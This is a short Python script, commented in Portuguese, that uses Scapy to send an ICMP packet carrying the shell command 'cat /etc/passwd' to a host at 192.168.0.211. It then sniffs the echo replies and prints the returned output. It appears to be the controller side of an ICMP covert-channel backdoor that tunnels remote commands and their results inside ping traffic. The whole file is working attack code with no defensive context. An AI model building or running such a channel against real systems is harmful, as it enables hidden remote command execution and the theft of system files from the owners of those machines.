from scapy.all import *


def receive_packet(packet):
    if ICMP in packet and packet[ICMP].type == 0:
        output = packet[Raw].load
        print(output.decode('utf-8'))

# Define o destino do pacote ICMP
target_ip = "192.168.0.211"  
teste = "cat /etc/passwd" #payload a ser utilizado


icmp_packet = IP(dst=target_ip)/ICMP()/teste

# Envia o pacote ICMP
send(icmp_packet, iface="wlp2s0")
sniff(filter="icmp", prn=receive_packet)
